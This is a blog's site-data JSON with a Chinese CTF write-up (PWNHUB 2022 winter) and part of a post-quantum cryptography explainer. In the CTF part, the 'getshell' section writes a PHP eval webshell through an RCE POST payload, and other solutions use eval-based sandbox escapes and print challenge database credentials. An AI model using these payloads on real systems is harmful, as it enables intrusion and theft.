{"meta":{"title":"Lazzaro","subtitle":"","description":"","author":"Lazzaro","url":"https://lazzzaro.github.io","root":"/"},"pages":[{"title":"分类","date":"2020-05-06T11:36:47.000Z","updated":"2020-05-06T11:43:15.674Z","comments":true,"path":"categories/index.html","permalink":"https://lazzzaro.github.io/categories/index.html","excerpt":"","text":""},{"title":"留言板","date":"2021-10-16T12:39:04.087Z","updated":"2020-05-21T14:14:51.458Z","comments":true,"path":"guestbook/index.html","permalink":"https://lazzzaro.github.io/guestbook/index.html","excerpt":"","text":""},{"title":"工具","date":"2020-05-06T11:40:16.000Z","updated":"2020-05-06T11:43:39.465Z","comments":true,"path":"links/index.html","permalink":"https://lazzzaro.github.io/links/index.html","excerpt":"","text":""},{"title":"标签","date":"2020-05-06T11:36:23.000Z","updated":"2020-05-12T13:48:09.659Z","comments":true,"path":"tags/index.html","permalink":"https://lazzzaro.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"PWNHUB2022冬季赛","slug":"match-PWNHUB2022冬季赛","date":"2022-12-18T15:20:03.000Z","updated":"2022-12-20T10:40:05.641Z","comments":true,"path":"2022/12/18/match-PWNHUB2022冬季赛/","link":"","permalink":"https://lazzzaro.github.io/2022/12/18/match-PWNHUB2022%E5%86%AC%E5%AD%A3%E8%B5%9B/","excerpt":"","text":"​ ✌️竞赛时间：12月17日 10:00—12月18日 22:00✌️得分规则：比赛采用动态分数制度 ，每道题目的分值将根据解出队伍的数量进行动态记分。✌️题目类型：Web、Pwn、Reverse、Misc、Crypto等 Rank: 9 misc坐井观天python逃逸，利用 eval(input()) 绕过关键字黑名单： 12eval(input())__import__(&quot;os&quot;).popen(&quot;env&quot;).read() ​ 证书里也有秘密xray证书信息解析，参考Github项目 xray-crack，将 main.go 编译： go build -o goxray main.go 再运行： ./goxray -p xray-license.lic 即可得到证书内容数据： 123version ok: 2license parsed: &#123;bc5d237dc9b7470e94b61687c19e62fc 3270cdada4eb4a809d25ff4820d5a1f7 王德发 COMMUNITY-ADVANCED 1320981071 1645539742&#125;crypto/rsa: verification error 故flag为user_id：flag&#123;3270cdada4eb4a809d25ff4820d5a1f7&#125;。 ​ crypto大杂烩 12345678910111213141516171819202122232425262728293031323334353637383940# sagefrom Crypto.Util.number import *from gmpy2 import *from random import *padding = lambda num, bit_len: (num &lt;&lt; (512 - bit_len)) + getrandbits(512 - bit_len)flag = b&#x27;**************************************&#x27;m1, m2 = bytes_to_long(flag[:19]), bytes_to_long(flag[19:])p = next_prime(padding(m1, m1.bit_length()))q = next_prime(padding(m2, m2.bit_length()))n = p * qe = getPrime(128)d = inverse(e, (p - 1) * (q-1))a, b = e &amp; 0x3ffffffffff, e &gt;&gt; 42N = getPrime(128)E = EllipticCurve(Zmod(N), [a, b])NN = getPrime(1024)S = inverse(getPrime(128), NN) * inverse(getPrime(128), NN)d1 = d &gt;&gt; 512d2 = d &amp; (1 &lt;&lt; 512) - 1enc1 = S * d1 % NNenc2 = S * d2 % NNprint(&#x27;n =&#x27;, n)print(&#x27;a =&#x27;, a)print(&#x27;N =&#x27;, N)print(&#x27;POINT =&#x27;, E.lift_x(996))print(&#x27;enc1 =&#x27;, enc1)print(&#x27;enc2 =&#x27;, enc2)print(&#x27;NN =&#x27;, NN)# n = 117749279680045360245987277946945707343578937283621512842997606104123872211782263906911929773756533011817679794905642225389185861207256322349591633257348367854563703050789889773031032949742664695416275919382068347995088593380486820784360816053546651916291080971628354468517506190756456913824397593128781030749# a = 1755716071599# N = 236038564943567983056828121309828109017# POINT = (996 : 151729833458737979764886336489671975339 : 1)# enc1 = 98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356# enc2 = 58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204# NN = 149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347 $a,b$ 分别为 $e$ 的低42位和高(128-42)位，有 $e=2^{42}b+a$。 $a$ 已知，根据点 $P=(P_x,P_y)$ 及椭圆曲线 $E$ 方程 $y^2 \\equiv x^3+ax+b \\pmod N$，代入求解 $b$。 同理，$d=2^{512}d_1+d_2$，因 $c_1 = Sd_1 \\bmod N’,c_2 = Sd_2 \\bmod N’$，分别使用类似Wiener Attack的格子求解 $d_1,d_2$。 最后已知 $e,d,n$，分解 $n$ 得 $p,q$，flag两部分分别在 $p,q$ 中。 12345678910111213141516171819202122232425262728293031323334353637383940414243import randomimport gmpy2def divide_pq(e, d, n): k = e*d - 1 while True: g = random.randint(2, n-1) t = k while True: if t % 2 != 0: break t //= 2 x = pow(g, t, n) if x &gt; 1 and gmpy2.gcd(x-1, n) &gt; 1: p = gmpy2.gcd(x-1, n) return (p, n//p)n = 117749279680045360245987277946945707343578937283621512842997606104123872211782263906911929773756533011817679794905642225389185861207256322349591633257348367854563703050789889773031032949742664695416275919382068347995088593380486820784360816053546651916291080971628354468517506190756456913824397593128781030749a = 1755716071599N = 236038564943567983056828121309828109017Px, Py = (996, 151729833458737979764886336489671975339)enc1 = 98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356enc2 = 58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204NN = 149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347F = Zmod(N)b = int(F(Py^2 - (Px^3 + a*Px)))e = 2^42 * b + aL1 = Matrix(ZZ, [[enc1, 2^256],[NN, 0]])d1 = -L1.LLL()[0][0]L2 = Matrix(ZZ, [[enc2, 2^256],[NN, 0]])d2 = -L2.LLL()[0][0]d = 2^512 * d1 + d2p, q = divide_pq(e, d, n)flag1 = bytes.fromhex(hex(p&gt;&gt;(512-19*8+2))[2:])flag2 = bytes.fromhex(hex(q&gt;&gt;(512-19*8+1))[2:])print(flag1)print(flag2)# b&#x27;4cb201080d8b240774&#125;&#x27;# b&#x27;flag&#123;e89f47939d1243&#x27; flag：flag&#123;e89f47939d12434cb201080d8b240774&#125;。 ​ pwnjustJSjs命令执行即可： eval(read(&quot;/flag&quot;)) 在 eval() 的报错文字中得到flag： 12345undefined:1: SyntanError: Unexpected token &#x27;&#123;&#x27;flag&#123;5cff08f23eb37451bd84effb99275794&#125; ^SyntanError: Unexpected token &#x27;&#123;&#x27; at input.js:1:6 ​ ppcTcp Show Description 众所周知，Wireshark 带有一个 follow tcp stream 功能，可以展示 TCP 流量的来回通信。 为了给某产品增加显示 TCP 来回流量的功能，你准备读取流量文件来生成类似的展示效果。 Input 第一行输入一个数字 N，表示接下来有 N 行。 接下来 N 行，每一行都由两部分组成。首先是一个数字 D，数字 D 为 0 表示为客户端发给服务器的方向，数字 D 为 1 表示服务器发给客户端方向；然后第二部分是一个 base64 字符串，表示编码后的流量具体内容。 Output 对于每一行的流量包，生成类似 wireshark 的 hexdump 模式的流量展示。其中： 每行开头都是 8 位 hex，表示当前这一行在该流量包的偏移。 两个空格之后，是该流量包的 hex dump 内容，每行 16 个 hex dump。 hex dump 之后，是该流量包内容的字符显示，对于可见字符(32 ~ 126)，显示字符本身，对于不可见字符，显示一个 . 号 对于无法凑齐 16 个 hex 的行，其不足的内容用空格代替。确保每一行的总长度是相等的。 根据下面的样例，仔细处理空格的数量。 按照输出要求格式化解析即可： 1234567891011121314151617181920212223242526from base64 import b64decodefrom math import ceilN = int(input())for c in range(N): k, b = input().split(&#x27; &#x27;) h = list(b64decode(b.encode())) if k == &#x27;0&#x27;: for i in range(ceil(len(h)/16)): ind = hex(i*16)[2:].rjust(8,&#x27;0&#x27;) hh = h[16*i:16*(i+1)] hh1 = &#x27; &#x27;.join([hex(j)[2:].rjust(2,&#x27;0&#x27;) for j in hh[:8]] + [&#x27; &#x27;]*(8-len(hh[:8]))) hh2 = &#x27; &#x27;.join([hex(j)[2:].rjust(2,&#x27;0&#x27;) for j in hh[8:]] + [&#x27; &#x27;]*(8-len(hh[8:]))) ch1 = &#x27;&#x27;.join([chr(j) if j in range(32,127) else &#x27;.&#x27; for j in hh[:8]]).ljust(8,&#x27; &#x27;) ch2 = &#x27;&#x27;.join([chr(j) if j in range(32,127) else &#x27;.&#x27; for j in hh[8:]]).ljust(8,&#x27; &#x27;) print(f&#x27;&#123;ind&#125; &#123;hh1&#125; &#123;hh2&#125; &#123;ch1&#125; &#123;ch2&#125;&#x27;) else: for i in range(ceil(len(h)/16)): ind = hex(i*16)[2:].rjust(8,&#x27;0&#x27;) hh = h[16*i:16*(i+1)] hh1 = &#x27; &#x27;.join([hex(j)[2:].rjust(2,&#x27;0&#x27;) for j in hh[:8]] + [&#x27; &#x27;]*(8-len(hh[:8]))) hh2 = &#x27; &#x27;.join([hex(j)[2:].rjust(2,&#x27;0&#x27;) for j in hh[8:]] + [&#x27; &#x27;]*(8-len(hh[8:]))) ch1 = &#x27;&#x27;.join([chr(j) if j in range(32,127) else &#x27;.&#x27; for j in hh[:8]]).ljust(8,&#x27; &#x27;) ch2 = &#x27;&#x27;.join([chr(j) if j in range(32,127) else &#x27;.&#x27; for j in hh[8:]]).ljust(8,&#x27; &#x27;) print(f&#x27; &#123;ind&#125; &#123;hh1&#125; &#123;hh2&#125; &#123;ch1&#125; &#123;ch2&#125;&#x27;) ​ Fight Clones Description Neo 被 Smith 的分身们包围了！他需要击败他们！ 每一个 Smith 都有自己的攻击值和生命值。在受到攻击之前，他们都可以持续攻击 Neo。 Neo 也有自己的攻击值和生命值，虽然比 Smith 高得多，但是 Neo 一次也只能攻击一个 Smith（是的他没有 AOE）。 Neo 需要找到一个最优的攻击策略，以保证自己生命值被减为零之前击倒所有 Smith。 Neo 的生命值是确定的，Oracle 之前告诉过他。但是他需要知道自己的攻击值是否能够确保打赢 Smith 们。 你能帮 Neo 计算出他所需要的最小攻击值么？ Input 第一行输入两个整数 $N H$ ($1 \\le N \\le 1000,1 \\le H \\le 1000000$)，表示总共有 $N$ 个 Smith，以及 Neo 的生命值为 $H$。 接下来 $N$ 行，表示 $N$ 个 Smith 的属性，每行格式为 $AH$，其中 - $A$ 为该 Smith 的攻击值 ($1 \\le A \\le 1000$)。 - $H$ 为该 Smith 的生命值 ($1 \\le H \\le 1000$)。 Output 输出一个整数，表示所需要的最小攻击值。如果无法保证击败 Smith 们则输出 -1。 Hint Neo 和 Smith 们是 实时战斗制（非回合制），即 Neo 和 Smith 们可以同时攻击对方，只不过 Neo 一个时间只能打一个 Smith， 而 Smith 们可以群殴 Neo（不用考虑碰撞体积的问题）。 可以假定 Neo 和 Smith 们每单位时间只能击打对手一次。例如，某个 Smith 生命值为 20，而 Neo 攻击值为 15，那 Neo 也需要消耗 两个单位的时间来消灭该 Smith，同时意味着有 10 单位的攻击力被浪费掉了。 Smith 一旦受到 Neo 的攻击，就会停止击打 Neo。例如 Neo 和 Smith 某一个时刻同时攻击对方，Neo 则不会受到伤害。 贪心算法+二分查找最小攻击值。 12345678910111213141516171819202122232425262728293031from functools import cmp_to_keydef custom_sort(x, y): return y[0] * x[2] - x[0] * y[2]def find_min_attack(neo_life, smiths): l = 1 r = 1000 ans = -1 while l &lt;= r: m = (l + r) // 2 s = [(k[0], k[1], (k[1]+m-1)//m) for k in smiths] s.sort(key=cmp_to_key(custom_sort)) res = 0 t = 0 for i in range(len(s)): res += t*s[i][0] t += s[i][2] if res &lt; neo_life: ans = m r = m - 1 else: l = m + 1 return ansN, H = list(map(int,input().split()))smiths = []for i in range(N): smiths.append(tuple(map(int,input().split()))) print(find_min_attack(H, smiths)) ​ gaming游戏来咯登录游戏就在公告栏看到flag：flag&#123;churusanguo&#125;。 ​ 攻城拔寨达到一定等级后游戏内会收到邮件，按 getshell 一题拿到权限后，找到 D:/APMServ5.2.6/www/htdocs/server/config/db.php，得到mysql数据库账号密码： 1234567define(&#x27;db_persistent&#x27;,1);define(&#x27;db_RDBMS&#x27;, &#x27;mysql&#x27;);define(&#x27;db_Username&#x27;, &#x27;sgphp1g2ame&#x27;);define(&#x27;db_Password&#x27;, &#x27;@Qwer123456&#x27;);define(&#x27;db_Server&#x27;, &#x27;127.0.0.1&#x27;);define(&#x27;db_Port&#x27;, &#x27;3306&#x27;);define(&#x27;db_Database&#x27;, &#x27;bloodwar&#x27;); 在蚁剑用mysql连接，账号 sgphp1g2ame，密码 @Qwer123456，在表 sys_mail_sys_content 中找到邮件内容：恭喜恭喜, flag2 flag&#123;jiaguanjinjueN&#125;。 ​ 特殊玩家有玩家的名字是flag，按 getshell 一题拿到权限后，源码自带修改器，打开前修改配置文件 config.ini： 123456789[config]IP=120.55.42.64数据库=bloodwar账号=sgphp1g2ame密码=@Qwer123456端口=3306路径=D:\\APMServ5.2.6\\www\\htdocs\\images\\armor聊天端口=5308登录信息= 打开修改器，在用户基本信息发现用户名 flag&#123;mysqlwo&#125;。 ​ getshell在源码 APMServ5.2.6/www/htdocs/server/game/BattleNetGateway.php 中发现容易控制传值的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php require_once(&quot;interface.php&quot;); require_once(&quot;utils.php&quot;); require_once(&quot;BattleFunc.php&quot;); require_once(&quot;HeroFunc.php&quot;); require_once(&quot;BattleNetServices.php&quot;); define(&quot;BATTLE_NET_KEY&quot;,&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;); if (!defined(&#x27;PATH_SEPARATOR&#x27;)) &#123;if (substr(PHP_OS, 0, 3) == &#x27;WIN&#x27;) define(&#x27;PATH_SEPARATOR&#x27;, &#x27;;&#x27;); else define(&#x27;PATH_SEPARATOR&#x27;, &#x27;:&#x27;);&#125; ini_set(&#x27;include_path&#x27;,ini_get(&#x27;include_path&#x27;).PATH_SEPARATOR.realpath(&quot;../&quot;)); $param=$_POST; if(empty($param))$param=$_GET; $from_uid=$param[&quot;from_uid&quot;]; $sign=$param[&quot;sign&quot;]; $commandFunc=$param[&quot;commandFunc&quot;]; $content=urldecode($param[&quot;content&quot;]); $content_encoding=$param[&quot;content-encoding&quot;]; //$tt=$from_uid.$commandFunc.$content.BATTLE_NET_KEY; $ret=array(); if($sign!=md5($from_uid.$commandFunc.$content.BATTLE_NET_KEY)) //sign为传入值与key连接字符串的md5值 $ret[]=0; else&#123; $ret[]=1; try&#123; if($content_encoding==&quot;csv&quot;)&#123; $inputParams=explode(&quot;|&quot;,$content); //按|分割content传入内容 if(count($inputParams)==1)&#123; $inputParams=$inputParams[0]; &#125; $ret[]=$commandFunc($from_uid,$inputParams); //RCE漏洞 &#125;else&#123; $inputParams=json_decode($content,true); if(is_array($inputParams)&amp;&amp;count($inputParams)==1)&#123; $inputParams=array_shift($inputParams); &#125; $ret[]=$commandFunc($from_uid,$inputParams); &#125; &#125;catch(Exception $e)&#123; $ret = array(0=&gt;0); $ret[] = $e-&gt;getMessage(); &#125; &#125; if($content_encoding==&quot;csv&quot;)&#123; print implode(&quot;|&quot;,$ret); &#125;else&#123; print json_encode($ret); &#125; ?&gt; 此处可以RCE，分析代码逻辑，利用 file_put_contents 写入一句话木马： POST: from_uid=xx.php&amp;commandFunc=file_put_contents&amp;content=&lt;%3fphp%20%40eval($_POST[xxx])%3b&amp;content-encoding=csv&amp;sign=734c00692057aaf9f6c763f405cbec6b 蚁剑连接，在D:目录下找到 flag.txt，flag：flag&#123;breakItAndOutIt&#125;。 ​ other文字频率分析非预期解法，将1000×1000图片分割为400张50×50的图片： 1234567891011from PIL import Imagefrom hashlib import md5im = Image.open(&#x27;word.png&#x27;)c = 0for i in range(20): for j in range(20): box = (50*i,50*j,50*(i+1),50*(j+1)) region = im.crop(box) region.save(f&#x27;img/&#123;c&#125;.png&#x27;) c += 1 测试发现相同字母的图片，其文件md5值相同，利用此规律统计字频，先操作一次找出26个字母对应文件的md5值： 1234567891011121314151617181920from hashlib import md5from collections import Countersample = [7,38,28,0,73,13,42,18,36,102,12,3,2,19, 9,58,20,1,5,30,50,24,11,22,8,66]m = []for i in range(400): path = fr&#x27;C:\\Users\\admin\\Desktop\\img\\&#123;i&#125;.png&#x27; m.append(md5(open(path,&#x27;rb&#x27;).read()).hexdigest())res = Counter(m)print(res)print(len(res))alp_md5 = [m[sample[i]] for i in range(26)]print(alp_md5)# 得到md5对应list# [&#x27;d108ad1582e37a825d092131a55babcc&#x27;, &#x27;9901603c7d2a5dde25723c9e569428da&#x27;, &#x27;5e47df30ddf5e623c9bbcd4fde58ec88&#x27;, &#x27;5bf0c7d972b37455dc32777ffdad86b9&#x27;, &#x27;33ff92480ee08585d901ffd0a47de021&#x27;, &#x27;3d3f026d8fc719c35a917d98d9b7474b&#x27;, &#x27;c07bd9475b8e9d65334e2f24f19794b3&#x27;, &#x27;4497c04cea4897727d88f7945bc86d77&#x27;, &#x27;047fd19a9a30301444e11394ee99d8be&#x27;, &#x27;802d7d3a2c02a1b6ba5f0860b70b54df&#x27;, &#x27;52d9844a5ed4eee07af4f48f880e3d5b&#x27;, &#x27;109d33cf832c83ebebca8c4f165862a9&#x27;, &#x27;f5252d81a8afc71cf5dd29270a398beb&#x27;, &#x27;121808a4d3f160f235f27cb77355d525&#x27;, &#x27;b15356da578f67bac5a3d777913ce97d&#x27;, &#x27;a174639d2070109e85ffb53657d5c9d5&#x27;, &#x27;e30a3ca0d2f0326a10175e8d6ed8a178&#x27;, &#x27;a267e80b28a9dae7e2c5d70198e808d7&#x27;, &#x27;e1e4b54464f7ae41ba2c71a9244d7347&#x27;, &#x27;ccf09a4c80cc7e4b3134ea53f423ec38&#x27;, &#x27;5b5480bc64f225e422ed8f084e629ff8&#x27;, &#x27;f17c5f58bf983a684cc8d7d4b3c1ae0b&#x27;, &#x27;287d3dac4e058281282e0eee00d9ddd4&#x27;, &#x27;a782a16d1fca70e6217e45dd3fe8ae6e&#x27;, &#x27;18cad01f22ca7c4bc9a7536474d17273&#x27;, &#x27;a4e1c4687c9c785271fc24f79aa2e0f0&#x27;] 再综合起来解题： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import *from hashlib import md5from pwnlib.util.iters import mbruteforcefrom base64 import b64decodefrom PIL import Imagefrom collections import Counterr = remote(&quot;47.97.127.1&quot;,20382)table = &#x27;0123456789abcdef&#x27;def pow(): r.recvuntil(&quot;plaintext: &quot;) suffix = r.recv(26).decode(&quot;utf8&quot;) r.recvuntil(&quot;md5_hex -&gt; &quot;) cipher = r.recvline().strip().decode(&quot;utf8&quot;) proof = mbruteforce(lambda x: md5((suffix+x).encode()).hexdigest() == cipher, table, length=6, method=&#x27;fixed&#x27;) r.sendlineafter(&#x27;&gt; &#x27;, suffix+proof) pow()r.recvline()open(&#x27;word.png&#x27;,&#x27;wb&#x27;).write(b64decode(r.recvline().strip()))im = Image.open(&#x27;word.png&#x27;)c = 0for i in range(20): for j in range(20): box = (50*i,50*j,50*(i+1),50*(j+1)) region = im.crop(box) region.save(&#x27;img/&#123;&#125;.png&#x27;.format(c)) c += 1 sample = [&#x27;d108ad1582e37a825d092131a55babcc&#x27;, &#x27;9901603c7d2a5dde25723c9e569428da&#x27;, &#x27;5e47df30ddf5e623c9bbcd4fde58ec88&#x27;, &#x27;5bf0c7d972b37455dc32777ffdad86b9&#x27;, &#x27;33ff92480ee08585d901ffd0a47de021&#x27;, &#x27;3d3f026d8fc719c35a917d98d9b7474b&#x27;, &#x27;c07bd9475b8e9d65334e2f24f19794b3&#x27;, &#x27;4497c04cea4897727d88f7945bc86d77&#x27;, &#x27;047fd19a9a30301444e11394ee99d8be&#x27;, &#x27;802d7d3a2c02a1b6ba5f0860b70b54df&#x27;, &#x27;52d9844a5ed4eee07af4f48f880e3d5b&#x27;, &#x27;109d33cf832c83ebebca8c4f165862a9&#x27;, &#x27;f5252d81a8afc71cf5dd29270a398beb&#x27;, &#x27;121808a4d3f160f235f27cb77355d525&#x27;, &#x27;b15356da578f67bac5a3d777913ce97d&#x27;, &#x27;a174639d2070109e85ffb53657d5c9d5&#x27;, &#x27;e30a3ca0d2f0326a10175e8d6ed8a178&#x27;, &#x27;a267e80b28a9dae7e2c5d70198e808d7&#x27;, &#x27;e1e4b54464f7ae41ba2c71a9244d7347&#x27;, &#x27;ccf09a4c80cc7e4b3134ea53f423ec38&#x27;, &#x27;5b5480bc64f225e422ed8f084e629ff8&#x27;, &#x27;f17c5f58bf983a684cc8d7d4b3c1ae0b&#x27;, &#x27;287d3dac4e058281282e0eee00d9ddd4&#x27;, &#x27;a782a16d1fca70e6217e45dd3fe8ae6e&#x27;, &#x27;18cad01f22ca7c4bc9a7536474d17273&#x27;, &#x27;a4e1c4687c9c785271fc24f79aa2e0f0&#x27;]m = []for i in range(400): path = &#x27;img/&#123;&#125;.png&#x27;.format(i) x = md5(open(path,&#x27;rb&#x27;).read()).hexdigest() m.append(x)res = Counter(m)print(res)print(len(res))out = []for i in range(26): out.append(res[sample[i]])print(out)r.recvuntil(&#x27;&gt; &#x27;)r.sendline(str(out).replace(&#x27; &#x27;,&#x27;&#x27;).strip(&#x27;[&#x27;).strip(&#x27;]&#x27;))r.interactive() 得到结果： 12Got it!flag&#123;d8b8a96466e21df8b45cce5ce875e95e&#125; ​ 图片识别给定动物样本数据，判断随机抽取10次动物图片，输入动物名称，正确至少8次给flag，每次3s内输入。 数量较少，非预期直接按照图片手动判断在3s内快速输入即可。 半自动交互： 1234567891011121314151617181920212223242526272829303132from pwn import *from hashlib import md5from pwnlib.util.iters import mbruteforcefrom base64 import b64decodefrom PIL import Imager = remote(&quot;47.97.127.1&quot;,28452)table = &#x27;0123456789abcdef&#x27;def pow(): r.recvuntil(&quot;plaintext: &quot;) suffix = r.recv(26).decode(&quot;utf8&quot;) r.recvuntil(&quot;md5_hex -&gt; &quot;) cipher = r.recvline().strip().decode(&quot;utf8&quot;) proof = mbruteforce(lambda x: md5((suffix+x).encode()).hexdigest() == cipher, table, length=6, method=&#x27;fixed&#x27;) r.sendlineafter(&#x27;&gt; &#x27;, suffix+proof) pow()r.recvline()r.recvline()for i in range(10): open(&#x27;animal.png&#x27;,&#x27;wb&#x27;).write(b64decode(r.recvline().strip())) img = Image.open(&#x27;animal.png&#x27;) img.show() r.recvuntil(&#x27;&gt; &#x27;) r.sendline(raw_input(&#x27;&gt; &#x27;)) print(r.recvline())r.interactive() ​ 垃圾邮件分析提供50封邮件内容的正常邮件/垃圾邮件分类，判断10封邮件内容属于哪种分类，全对给flag。 数量较少，非预期直接按照内容手动判断即可。 PoW部分： 12345678910111213141516171819202122232425from pwn import *from hashlib import sha256import stringfrom pwnlib.util.iters import mbruteforcer = remote(&quot;47.97.127.1&quot;,27218)table = string.ascii_letters+string.digitsdef pow(): r.recvuntil(&quot;sha256(&quot;) suffix = r.recv(28).decode(&quot;utf8&quot;) r.recvuntil(&quot;= &quot;) cipher = r.recvline().strip().decode(&quot;utf8&quot;) proof = mbruteforce(lambda x: sha256((suffix+x).encode()).hexdigest() == cipher, table, length=4, method=&#x27;fixed&#x27;) r.sendlineafter(&#x27;xxxx = &#x27;, proof) pow()for i in range(51): print(i) r.recvuntil(&#x27;Press ENTER to continue... &#x27;) r.sendline() r.interactive() 按内容手动判断输入H（正常邮件）或S（垃圾邮件），得到结果： 12Good job! Just take it:flag&#123;da238e5ee5716136c6884c0b4a369093&#125; ​","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2022赛","slug":"2022赛","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"后量子密码","slug":"crypto-后量子密码","date":"2022-12-16T14:04:27.000Z","updated":"2022-12-16T18:07:40.415Z","comments":true,"path":"2022/12/16/crypto-后量子密码/","link":"","permalink":"https://lazzzaro.github.io/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/","excerpt":"","text":"​ 后量子密码学（Post-Quantum Cryptography，PQC），又称抗量子计算密码学，是密码学的一个研究领域，专门研究能够抵抗量子计算机的加密算法，特别是公钥加密（非对称加密）算法。不同于量子密码学，后量子密码学使用现有的电子计算机，不依靠量子力学，它依靠的是密码学家认为无法被量子计算机有效解决的计算难题。 在公钥加密方面，后量子密码学的研究方向包括了格密码学（Lattice-based Cryptography）、容错学习问题（LWE）、多变量密码学（英语：Multivariate Cryptography）、散列密码学（英语：Hash-based Cryptography）、编码密码学（Code-based Cryptography）与超奇异椭圆曲线同源密码学（Supersingular Isogeny Key Exchange）。密码学家认为，基于这些计算难题有望构建出不受量子计算机的威胁的公钥加密系统，替代现有的方案。 ​ 超奇异同源密钥交换（SIDH）超奇异椭圆曲线同源密码学（Supersingular Elliptic Curve Isogeny Cryptography）是利用超奇异椭圆曲线（Supersingular Elliptic Curves）与超奇异同源图（Supersingular Isogeny Graphs）的数学性质的密码学，可以实现超奇异同源密钥交换（Supersingular Isogeny Key Exchange，SIKE）（协议为超奇异同源Diffie-Hellman密钥交换协议，SIDH），具有前向安全性。其使用方法和现有的Diffie-Hellman密钥交换相似，有望直接替代当前的常规椭圆曲线密钥交换（ECDH）。 Diffie-Hellman基本协议： 抽象Diffie-Hellman： Alice的秘密是 $a$，她的计算先做→，得到 $g^a$，再做↓，得到 $g^{ab}$。而Bob的秘密是 $b$，他先做↓，再做→。殊途同归得到 $g^{ab}$。 SIDH构造的简化版本SIDH的基本代数结构是超奇异椭圆曲线群 $E$ 和超奇异同源（Isogeny）$\\phi$。基本思路如下图所示： 首先，超奇异椭圆曲线群 $E$ 理解为一个群。其次，构造用到的超奇异同源 $\\phi : E \\mapsto E’$ 是从群 $E$ 到群 $E’$ 的一种群同态。算法类似DH算法分为以下两个步骤： 首先，Alice选取一个点 $R_A \\in E$，$\\langle R_A \\rangle$ 确定了群 $E$ 的一个子群，然后可以计算得到一个从 $E$ 映射到其子群 $E_A$ 的同源 $\\phi_A: E \\mapsto E_A$，这是Alice的秘密信息。Alice发送公开信息 $E_A$ 给Bob。 同样，Bob选择点 $R_B\\in E$，然后计算得到 $\\phi_B: E \\mapsto E_B$，把公开信息 $E_B$ 发送给Alice。 最终Alice算出 $E/\\langle R_B, R_A \\rangle$，Bob算出 $E/\\langle R_A, R_B \\rangle$。上图中的 $E/\\langle R_A \\rangle$ 和 $E/\\langle R_B \\rangle$ 分别是 $E_A$ 和 $E_B$，这样表达是为了与之前的表达一致，其实这里并不是做商群，而是表达说 $\\phi_A$ 的Kernel是 $\\langle R_A \\rangle$。目前的科技文献大多使用这种表达。 上面说到，$E_A$ 是曲线群 $E$ 的子群，它由同源 $\\phi_A$ 决定，可理解为群同态 $\\phi_A$ 映射到 $E$ 上的像 (Image)形成的子群。同理，$E_{BA}$ 是同源 $\\phi_{BA}$ 映射到 $E$ 上的子群，而同源 $\\phi_{BA}$ 是由 $\\langle R_B, R_A \\rangle$ 决定的，即同源 $\\phi_{BA}$ 的Kernel是 $\\langle R_B, R_A \\rangle$。 SIDH构造的细化版本 为了满足Alice在没有Bob的秘密信息的情况下能计算出 $E_{BA}$ 的要求，SIDH需要使用更多的参数设计和相关计算。算法增加描述如下： SIDH参数设计首先，选择超奇异椭圆曲线 $E$ 作为公开参数。然后Alice随机选择两个元素 $P_A, Q_A \\in E$，并公开作为自己的公共参数。同样，Bob也随机选择两个元素 $P_B, Q_B \\in E$ 并公开。 Alice的操作 随机选择两个整数 $s_A$ 和 $t_A$ 作为秘密信息，计算 $R_A = s_A P_A + t_A Q_A\\in E$，并由 $R_A$ 计算得到一个从 $E$ 映射到其子群 $E_A$ 的同源 $\\phi_A: E \\mapsto E_A$，这也是Alice的秘密信息； 获取Bob的公开信息，并计算 $\\phi_A(P_B)$ 和 $\\phi_A(Q_B)$，这些是公开信息； Alice发送公开信息 $E_A$、$\\phi_A(P_B)$ 和 $\\phi_A(Q_B)$ 给Bob。 Bob的操作 随机选择两个整数 $s_B$ 和 $t_B$ 作为秘密信息，计算 $R_B = s_B P_B + t_B Q_B\\in E$，并由 $R_B$ 计算得到一个从 $E$ 映射到其子群 $E_B$ 的同源 $\\phi_B: E \\mapsto E_B$，这也是Bob的秘密信息； 获取Alice的公开信息，并计算 $\\phi_B(P_A)$ 和 $\\phi_B(Q_A)$，这些是公开信息； Bob发送公开信息 $E_B$、$\\phi_B(P_A)$ 和 $\\phi_B(Q_A)$ 给Alice。 秘密值的计算Alice计算子群 $E_{BA}$ ，方法如下： 注意，此时Alice掌握的信息是 $s_A$、$t_A$、$R_A$、$\\phi_B(P_A)$ 和 $\\phi_B(Q_A)$，她想计算得到 $\\phi_B(R_A)$。并且要强调，$\\phi_B$ 是一种群同态。 利用群同态的属性可计算得到：$\\phi_B(R_A) = \\phi_B(s_A P_A + t_A Q_A) = s_A \\phi_B(P_A) + t_A \\phi_B(Q_A)$ 。 根据 $\\phi_B(R_A)$ 计算 $E_{BA}$。$E_{BA}$是曲线群 $E$ 的子群，是以 $\\phi_B (R_A)$ 为Kernel的群同态映射到 $E$ 上的子群。这个群同态也就是Isogeny，这个Isogeny记为 $\\phi_{BA}$ 。 类似的，Bob可以计算子群 $E_{AB}$： $\\phi_A(R_B) = s_B 